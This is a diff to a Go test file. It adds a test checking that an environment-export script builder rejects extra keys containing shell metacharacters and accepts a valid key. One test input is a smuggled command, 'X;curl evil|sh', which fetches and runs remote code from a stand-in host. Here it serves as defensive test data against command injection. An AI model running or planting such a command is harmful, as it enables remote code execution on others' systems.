@@ -78,6 +78,20 @@ func TestDotEnvExportScript_FormatsAsBashExports(t *testing.T) {
 	assert.Contains(t, script, "WITH_SPACE='hello world'\n")
 }
 
+// Extra env keys don't come from .env (which validates them), so they must be
+// validated too — a key with shell metacharacters would be command injection on
+// the `export <key>=...` path where value-quoting can't protect the left side.
+func TestDotEnvExportScript_RejectsInvalidExtraKey(t *testing.T) {
+	dir := t.TempDir() // no .env
+
+	_, err := DotEnvExportScript(dir, map[string]string{"X;curl evil|sh": "1"})
+	require.Error(t, err, "an extra key with shell metacharacters must be rejected")
+
+	script, err := DotEnvExportScript(dir, map[string]string{"SHARD_INDEX": "0"})
+	require.NoError(t, err, "a valid extra key is accepted")
+	assert.Contains(t, script, "export SHARD_INDEX=")
+}
+
 func TestSweepStaleEnvFiles_RemovesOnlyStaleEnvFiles(t *testing.T) {
 	tmp := os.TempDir()
 
